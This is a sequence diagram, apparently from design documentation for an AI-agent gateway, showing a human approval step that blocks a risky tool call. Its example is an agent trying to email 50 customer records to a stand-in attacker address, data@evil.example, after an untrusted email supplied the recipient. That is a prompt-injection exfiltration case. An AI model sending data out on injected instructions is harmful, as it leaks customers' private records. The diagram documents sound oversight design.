sequenceDiagram
  autonumber
  participant A as AI agent
  participant G as Gateway
  participant S as Approval service
  participant N as Notifier (SSE + Web Push)
  participant M as Approver PWA (phone)
  actor H as Approver
  participant L as Audit log
  A->>G: send_email(to=data@evil.example, body=…)
  G->>G: policy + taint → REQUIRE_APPROVAL
  G->>L: tool_call.decision (require_approval)
  G->>S: request(call, decision)
  S->>S: plain-language summary (EN/AR)
  S->>N: publish approval.requested
  N-->>M: push notification + live update
  M->>H: "Agent wants to email 50 customer records to an external address. Recipient came from an untrusted email."
  H->>M: Deny (+ note)
  M->>S: POST /api/approvals/{id}/decision
  S-->>G: status = denied
  G->>L: approval.decided
  G-->>A: blocked: denied by human approver
  Note over G,S: No decision before the timeout → EXPIRED → treated as DENY (fail-safe)
